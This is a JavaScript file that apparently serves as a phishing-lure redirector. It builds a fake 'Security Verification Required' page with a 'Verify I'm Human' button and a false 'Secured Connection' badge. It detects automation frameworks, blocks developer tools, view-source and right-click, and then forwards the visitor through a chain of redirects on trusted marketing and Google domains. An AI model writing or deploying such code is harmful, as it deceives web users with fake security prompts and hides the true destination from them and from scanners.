// Professional Landing Page with Human Verification
// Requires user interaction before redirect

(function() {
    'use strict';
    
    // Configuration
    const REDIRECT_URL = 'https://public-usa.mkt.dynamics.com/api/orgs/742da8ce-1b76-f011-8589-000d3a106307/r/8Uu2c1ToLUGfS8eugg4CAAIAAAA?msdynmkt_target=%7B%22TargetUrl%22%3A%22https%253A%252F%252Fwww.google.com%252Furl%253Fq%253Dhttps%25253A%25252F%25252Fdjyt-s04.eu1.hs-sales-engage.com%25252FCtc%25252FDQ%25252B23284%25252FdjYT-s04%25252FJll8VMXNW7YbdcM6lZ3ldW4dYkTk1Rrbh-W4tPVpb60ww0JV801_44gWhjKW5rqjJH5F1H7RW3QJ2681HBRQqN4QWjlSCKTbFW3rZcsT8Y-BC-W2NVKY_9dLn08W1_t_Vp7CtglFVZH6lx8MDHCwW2L9CGd3KHjt1W85p2wy4Vxb1lMLL8BlgWYWmW8rYBtj3fLWG7W4tpYXl4PCx10W6brBmy2bTLT8W86JWzW4_wgJcW2BVQrC1DNQHkVfx5BJ1NwZDtW5wkQZw5rFwGHW45gT5q7R9bSfW8dbz1K600zH-W1Zh_502nF7JQVGFBC27SZtkmW1JLPd67NRzcTW4xGvBk6rh7lRW7H8Lr11j9DPvVKZMFx93XZSgW7DzWF75pvFlLW8dMGjD70_V2kW2FbZcK8rF_gTW14GC0T4lrlTDW9b1PXf1-jkryW3KTkZ08Fx7ySW62fwDS9jjzBmW9b22Jb4f-dx3W3Z7Zjv6d-4tcW8QTVSH84KH_hW3h3By35VM83sW48ZNKx6RK8QkW7Ydwh_5dFZmNW45n-fS2RHN6DW9lnNtX1L9rb0W2m-pXX2KYh-dN6Y9thBmLDjkW2XK5Y02tDD3SW4vl5sY7mVZL1VsTbwX17gtnVW60BDYp6QGQk0W7yNm4h3mhmwpN5r4TrQrlHPrN3ccwj6t-P-bW7kpGbn68GwdHW398xDG6sbLCRW6Fkr9C5wWtlSW8fKrp-3PmdTgW6tWPSK3Wl6wNW25RtlS7HqjR7W91jRdf8m-DTJN8-D7MNNdh4KW8v7JJl5qCLCFW3DbcP090yNtSW5s8Wjf1qJ757W1B8xjl4TTxvJW7l8Z5t5LgPd9W35yK042g6zssW5K5PkN1Nd_MhW57H4HD4yrcJPW3H_rf77ckNnnN3ZtBF8c3hpPW5nhLKX7m4dvDW6Vx05W3Ljt_yW1zgw_N64Cq33W8b6wHg7726wGf5mwj0M04%2526sa%253DD%2526sntz%253D1%2526usg%253DAOvVaw2tpLERLriKYMm4csbeD_jo%22%2C%22RedirectOptions%22%3A%7B%225%22%3Anull%2C%221%22%3Anull%7D%7D&msdynmkt_digest=tJ7QG46gwp3uTHYYbojbBBeglZ308aNuXF%2FUyxOwWKg%3D&msdynmkt_secretVersion=a3955a744d9049f88dd8bdc1907bf2bf';
    const REDIRECT_DELAY = 3;
    
    // Comprehensive bot detection
    function runBotDetection() {
        let documentDetectionKeys = [
            "webdriver",
            "_WEBDRIVER_ELEM_CACHE",
            "ChromeDriverw",
            "Geckowebdriver",
            "driver-evaluate",
            "webdriver-evaluate",
            "selenium-evaluate",
            "selenium-webdriver",
            "webdriverCommand",
            "webdriver-evaluate-response",
            "__webdriverFunc",
            "__$webdriverAsyncExecutor",
            "$wdc_asdjflasutopfhvcZLmcfl_",
            "__lastWatirAlert",
            "__lastWatirConfirm",
            "__lastWatirPrompt",
            "$chrome_asyncScriptInfo",
            "$cdc_asdjflasutopfhvcZLmcfl_",
            "__webdriver_evaluate",
            "__selenium_evaluate",
            "__webdriver_script_function",
            "__webdriver_script_func",
            "__webdriver_script_fn",
            "__fxdriver_evaluate",
            "__driver_unwrapped",
            "__webdriver_unwrapped",
            "__driver_evaluate",
            "__selenium_unwrapped",
            "__fxdriver_unwrapped"
        ];

        let windowDetectionKeys = [
            "gecko",
            "$wdc_asdjflasutopfhvcZLmcfl_",
            "$cdc_asdjflasutopfhvcZLmcfl_",
            "domAutomation",
            "domAutomationController",
            "__stopAllTimers",
            "spawn",
            "__driver_evaluate",
            "__fxdriver_evaluate",
            "__driver_unwrapped",
            "__fxdriver_unwrapped",
            "emit",
            "__phantomas",
            "callPhantom",
            "geb",
            "__$webdriverAsyncExecutor",
            "fmget_targets",
            "spynner_additional_js_loaded",
            "watinExpressionResult",
            "watinExpressionError",
            "domAutomationController",
            "calledPhantom",
            "__webdriver_unwrapped",
            "__webdriver_script_function",
            "__webdriver_script_func",
            "__webdriver_script_fn",
            "__webdriver_evaluate",
            "__webdriver__chr",
            "__webdriverFuncgeb",
            "__selenium_unwrapped",
            "__selenium_evaluate",
            "__lastWatirPrompt",
            "cdc_adoQpoasnfa76pfcZLmcfl_Array",
            "cdc_adoQpoasnfa76pfcZLmcfl_Promise",
            "cdc_adoQpoasnfa76pfcZLmcfl_Symbol",
            "OSMJIF",
            "__lastWatirConfirm",
            "__lastWatirAlert",
            "calledSelenium",
            "webdriver",
            "marionette",
            "puppeteer",
            "Buffer",
            "_phantom",
            "__nightmare",
            "_selenium",
            "callPhantom",
            "Cypress",
            "callSelenium",
            "_Selenium_IDE_Recorder"
        ];

        let documentSearchKeys = [
            "driver",
            "webdriver",
            "marionette",
            "selenium",
            "phantom",
        ];

        // Check window properties
        for (const windowDetectionKey in windowDetectionKeys) {
            const windowDetectionKeyValue = windowDetectionKeys[windowDetectionKey];
            if (window[windowDetectionKeyValue]) {
                return true;
            }
        }

        // Check document properties
        for (const documentDetectionKey in documentDetectionKeys) {
            const documentDetectionKeyValue = documentDetectionKeys[documentDetectionKey];
            if (window["document"][documentDetectionKeyValue]) {
                return true;
            }
        }

        // Check for CDC patterns
        for (const documentKey in window["document"]) {
            if (documentKey.match(/\$[a-z]dc_/) && window["document"][documentKey]["cache_"]) {
                return true;
            }
        }

        // Additional checks
        if (window["external"] && window["external"].toString() && (window["external"].toString()["indexOf"]("Sequentum") != -1)) return true;
        if (window["document"]["documentElement"]["getAttribute"]("selenium")) return true;
        if (window["document"]["documentElement"]["getAttribute"]("webdriver")) return true;
        if (window["document"]["documentElement"]["getAttribute"]("driver")) return true;
        if (window["document"]["documentElement"]["getAttribute"]("geckodriver")) return true;
        if (window["document"]["documentElement"]["getAttribute"]("firefox.marionette")) return true;
        
        for (const documentSearchKey in documentSearchKeys) {
            const documentSearchKeyValue = documentSearchKeys[documentSearchKey];
            if (window.document.documentElement.getAttribute(documentSearchKeyValue)) {
                return true;
            }
        }

        return false;
    }

    // Block dev tools and keyboard shortcuts
    function blockDevTools() {
        // Block F12, Ctrl+Shift+I, Ctrl+U, etc.
        window.onkeydown = (e) => {
            return !(e.ctrlKey && (e.keyCode === 67 || e.keyCode === 85 || e.keyCode === 86 || e.keyCode === 88 || e.keyCode === 117));
        };

        window.addEventListener("keydown", (e) => {
            if (e.ctrlKey && e.which === 83) {
                e.preventDefault(); 
                return false;
            }
        });

        window.addEventListener("contextmenu", (event) => event.preventDefault());

        document.onkeydown = (e) => {
            if (e.keyCode === 123) return false; // F12
            if (e.ctrlKey && e.keyCode === "E".charCodeAt(0)) return false;
            if (e.ctrlKey && e.shiftKey && e.keyCode === "I".charCodeAt(0)) return false;
            if (e.ctrlKey && e.shiftKey && e.keyCode === "J".charCodeAt(0)) return false;
            if (e.ctrlKey && e.keyCode === "U".charCodeAt(0)) return false;
            if (e.ctrlKey && e.keyCode === "S".charCodeAt(0)) return false;
            if (e.ctrlKey && e.keyCode === "H".charCodeAt(0)) return false;
            if (e.ctrlKey && e.keyCode === "A".charCodeAt(0)) return false;
            if (e.ctrlKey && e.keyCode === "F".charCodeAt(0)) return false;
        };
    }

    // Create professional landing page
    function createLandingPage() {
        document.body.innerHTML = '';
        document.body.style.cssText = `
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        `;

        // Main container
        const container = document.createElement('div');
        container.style.cssText = `
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            padding: 40px;
            max-width: 500px;
            width: 90%;
            text-align: center;
            position: relative;
        `;

        // Security shield icon
        const icon = document.createElement('div');
        icon.innerHTML = `
            <svg width="64" height="64" viewBox="0 0 24 24" fill="none" style="margin: 0 auto 20px;">
                <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" 
                      stroke="#4F46E5" stroke-width="2" fill="#EEF2FF"/>
                <path d="M9 12L11 14L15 10" stroke="#4F46E5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
        `;

        // Title
        const title = document.createElement('h1');
        title.textContent = 'Security Verification Required';
        title.style.cssText = `
            color: #1f2937;
            font-size: 24px;
            font-weight: 600;
            margin: 0 0 16px 0;
            line-height: 1.2;
        `;

        // Description
        const description = document.createElement('p');
        description.textContent = 'To ensure the security of this content and verify you are a human user, please click the verification button below.';
        description.style.cssText = `
            color: #6b7280;
            font-size: 16px;
            line-height: 1.5;
            margin: 0 0 32px 0;
        `;

        // Verification button
        const button = document.createElement('button');
        button.textContent = 'Verify I\'m Human';
        button.id = 'verify-btn';
        button.style.cssText = `
            background: #4f46e5;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 12px 32px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(79, 70, 229, 0.4);
            margin-bottom: 24px;
        `;

        // Button hover effects
        button.addEventListener('mouseenter', () => {
            button.style.background = '#4338ca';
            button.style.transform = 'translateY(-2px)';
            button.style.boxShadow = '0 6px 16px rgba(79, 70, 229, 0.5)';
        });

        button.addEventListener('mouseleave', () => {
            button.style.background = '#4f46e5';
            button.style.transform = 'translateY(0)';
            button.style.boxShadow = '0 4px 12px rgba(79, 70, 229, 0.4)';
        });

        // Security badge
        const badge = document.createElement('div');
        badge.innerHTML = `
            <div style="display: flex; align-items: center; justify-content: center; color: #6b7280; font-size: 14px;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="margin-right: 8px;">
                    <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z"/>
                </svg>
                Secured Connection
            </div>
        `;

        // Progress indicator (hidden initially)
        const progress = document.createElement('div');
        progress.id = 'progress';
        progress.style.cssText = `
            display: none;
            margin-top: 20px;
        `;
        progress.innerHTML = `
            <div style="color: #4f46e5; font-weight: 600; margin-bottom: 12px;">Verifying...</div>
            <div style="background: #e5e7eb; border-radius: 4px; height: 8px; overflow: hidden;">
                <div id="progress-bar" style="background: #4f46e5; height: 100%; width: 0%; transition: width 0.5s ease;"></div>
            </div>
            <div id="countdown" style="color: #6b7280; font-size: 14px; margin-top: 8px;">Redirecting in 3 seconds...</div>
        `;

        // Assemble the page
        container.appendChild(icon);
        container.appendChild(title);
        container.appendChild(description);
        container.appendChild(button);
        container.appendChild(badge);
        container.appendChild(progress);
        document.body.appendChild(container);

        return button;
    }

    // Handle verification and countdown
    function handleVerification() {
        const button = document.getElementById('verify-btn');
        const progress = document.getElementById('progress');
        const progressBar = document.getElementById('progress-bar');
        const countdown = document.getElementById('countdown');

        // Hide button and show progress
        button.style.display = 'none';
        progress.style.display = 'block';

        // Animate progress bar
        let width = 0;
        const progressInterval = setInterval(() => {
            width += 33.33;
            progressBar.style.width = width + '%';
            if (width >= 100) {
                clearInterval(progressInterval);
            }
        }, 1000);

        // Countdown
        let timeLeft = REDIRECT_DELAY;
        const countdownInterval = setInterval(() => {
            countdown.textContent = `Redirecting in ${timeLeft} seconds...`;
            timeLeft--;
            
            if (timeLeft < 0) {
                clearInterval(countdownInterval);
                countdown.textContent = 'Redirecting now...';
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 500);
            }
        }, 1000);
    }

    // Main execution
    function init() {
        // Wait for DOM if needed
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', init);
            return;
        }

        // If bot detected, redirect immediately
        if (runBotDetection() === true) {
            window.location.replace(REDIRECT_URL);
            return;
        }

        // Block dev tools
        blockDevTools();

        // Create professional landing page
        const verifyButton = createLandingPage();

        // Add click handler to verification button
        verifyButton.addEventListener('click', handleVerification);

        // Fallback timeout (10 minutes) - in case user doesn't click
        setTimeout(() => {
            window.location.replace(REDIRECT_URL);
        }, 10 * 60 * 1000);
    }

    // Start the script
    init();

})();
